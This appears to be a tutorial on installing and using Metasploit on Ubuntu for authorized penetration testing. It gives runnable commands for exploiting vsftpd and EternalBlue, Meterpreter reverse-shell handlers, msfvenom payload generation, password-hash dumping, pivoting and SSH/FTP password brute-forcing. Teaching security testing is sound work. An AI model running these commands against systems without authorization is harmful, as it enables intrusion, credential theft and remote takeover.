# How to Use Metasploit Framework on Ubuntu

Author: [nawazdhandala](https://github.com/nawazdhandala)

Tags: Ubuntu, Metasploit, Security, Penetration Testing, Ethical Hacking

Description: A guide to installing and using Metasploit Framework on Ubuntu for authorized penetration testing, including basic exploitation, post-exploitation, and reporting.

---

Metasploit Framework is the most widely used penetration testing platform. It provides a collection of exploits, payloads, auxiliary modules, and post-exploitation tools that allow security professionals to test systems for vulnerabilities in a systematic way. This guide covers installation, basic usage, and common workflows. Only use Metasploit against systems you own or have explicit written permission to test.

## Installing Metasploit Framework

The official Metasploit installer is the recommended method for Ubuntu:

```bash
# Method 1: Rapid7's official installer (recommended)
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb \
  > /tmp/msfinstall

chmod 755 /tmp/msfinstall
sudo /tmp/msfinstall

# The installer puts Metasploit in /opt/metasploit-framework/
# and adds wrapper scripts to /usr/local/bin/
which msfconsole

# Method 2: From Kali/Parrot repositories on Ubuntu (alternative)
# This method is useful if you are running Ubuntu and want apt management
wget -q https://apt.metasploit.com/metasploit-framework.gpg.key -O- \
  | sudo apt-key add -
echo "deb https://apt.metasploit.com/ xenial main" \
  | sudo tee /etc/apt/sources.list.d/metasploit.list
sudo apt update
sudo apt install metasploit-framework
```

## Initial Setup

```bash
# Initialize the Metasploit database (uses PostgreSQL)
sudo msfdb init

# Start the database
sudo msfdb start

# Launch the Metasploit console
msfconsole

# Verify database connection inside msfconsole
msf6 > db_status
# Expected: [*] Connected to msf. Connection type: postgresql.

# Update Metasploit to latest modules
msf6 > msfupdate
# Or from the shell:
sudo /opt/metasploit-framework/bin/msfupdate
```

## Navigating the Metasploit Console

```bash
# Start the console
msfconsole

# Get help
msf6 > help
msf6 > help search

# Search for modules
msf6 > search type:exploit platform:linux

# Search for a specific vulnerability
msf6 > search ms17-010
msf6 > search eternal blue
msf6 > search apache struts

# Show module information
msf6 > info exploit/windows/smb/ms17_010_eternalblue

# Select a module
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# View required options for the selected module
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > show advanced

# Set options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.5

# Show available payloads
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
```

## Running an Authorized Vulnerability Scan

Before exploiting, enumerate targets with auxiliary scanning modules:

```bash
# Port scanning via Metasploit (wraps nmap)
msf6 > db_nmap -sV -sC -O 192.168.1.0/24

# View hosts discovered by the scan
msf6 > hosts

# View open services
msf6 > services

# View discovered vulnerabilities
msf6 > vulns

# SMB version scanning
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/smb/smb_version) > run

# SSH version scanning
msf6 > use auxiliary/scanner/ssh/ssh_version
msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/ssh/ssh_version) > run

# Web application fingerprinting
msf6 > use auxiliary/scanner/http/http_version
msf6 auxiliary(scanner/http/http_version) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/http/http_version) > run
```

## Using the Database for Workspace Organization

```bash
# Create workspaces to organize different assessments
msf6 > workspace -a client_assessment_2026_03

# List workspaces
msf6 > workspace

# Switch workspace
msf6 > workspace client_assessment_2026_03

# View all hosts in current workspace
msf6 > hosts -c address,os_name,purpose

# Export hosts and findings
msf6 > hosts -o /tmp/hosts.csv
msf6 > services -o /tmp/services.csv
```

## Configuring and Running Exploits

Complete example against a test system (only on systems you own):

```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

# Set target
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.50
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21

# Set payload (what to do after exploitation)
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set PAYLOAD cmd/unix/interact

# Run the exploit
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

# If successful, you get a shell prompt
# Back in msfconsole with Ctrl+Z
# Sessions are tracked
msf6 > sessions -l
msf6 > sessions -i 1  # Interact with session 1
```

## Meterpreter Post-Exploitation

Meterpreter is an advanced payload that provides many post-exploitation capabilities:

```bash
# Using a Meterpreter payload
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.5
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run -j  # Run as background job

# Once connected, interact with the session
msf6 > sessions -i 1

# Meterpreter commands
meterpreter > sysinfo          # System information
meterpreter > getuid           # Current user
meterpreter > getsystem        # Attempt privilege escalation
meterpreter > ps               # List processes
meterpreter > hashdump         # Dump password hashes (requires admin)
meterpreter > screenshot       # Take a screenshot
meterpreter > shell            # Drop into a system shell

# File system
meterpreter > ls
meterpreter > download /etc/passwd /tmp/
meterpreter > upload /tmp/file.txt /tmp/

# Pivoting to other networks
meterpreter > run post/multi/manage/shell_to_meterpreter
meterpreter > background  # Background the session
msf6 > route add 10.0.0.0 255.255.255.0 1  # Route through session 1
```

## Generating Payloads with msfvenom

msfvenom generates standalone payloads for use outside of Metasploit:

```bash
# Generate a Linux reverse shell payload (ELF binary)
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.5 \
  LPORT=4444 \
  -f elf \
  -o /tmp/shell.elf

# Generate a Windows payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.5 \
  LPORT=4444 \
  -f exe \
  -o /tmp/shell.exe

# Generate a Python payload
msfvenom -p python/meterpreter/reverse_tcp \
  LHOST=192.168.1.5 \
  LPORT=4444 \
  -o /tmp/shell.py

# List all available payloads
msfvenom -l payloads

# List available formats
msfvenom --list formats
```

## Running Auxiliary Modules for Credential Testing

```bash
# Test SSH credentials (authorized testing only)
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.1.50
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME admin
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/ssh/ssh_login) > run

# Test FTP login
msf6 > use auxiliary/scanner/ftp/ftp_login
msf6 auxiliary(scanner/ftp/ftp_login) > set RHOSTS 192.168.1.50
msf6 auxiliary(scanner/ftp/ftp_login) > set USER_FILE /tmp/users.txt
msf6 auxiliary(scanner/ftp/ftp_login) > set PASS_FILE /tmp/passwords.txt
msf6 auxiliary(scanner/ftp/ftp_login) > run

# View successful credentials
msf6 > creds
```

## Generating Reports

```bash
# Export discovered vulnerabilities and findings
msf6 > vulns

# Full report from the database
msf6 > hosts -o /tmp/assessment_hosts.csv
msf6 > services -o /tmp/assessment_services.csv
msf6 > creds -o /tmp/assessment_creds.csv
msf6 > loot -o /tmp/assessment_loot.csv

# View all loot collected (files downloaded, hashes, etc.)
msf6 > loot
```

## Resource Scripts for Automation

Save and replay command sequences with resource scripts:

```bash
# Create a resource script
cat << 'EOF' > /tmp/smb_scan.rc
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
set THREADS 20
run
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run
EOF

# Run the resource script
msfconsole -r /tmp/smb_scan.rc
```

Remember that Metasploit is a dual-use tool. The same techniques defenders use to find vulnerabilities in their own infrastructure are the techniques attackers use. Obtain written authorization before any testing, document your scope clearly, and follow responsible disclosure practices if vulnerabilities are found.
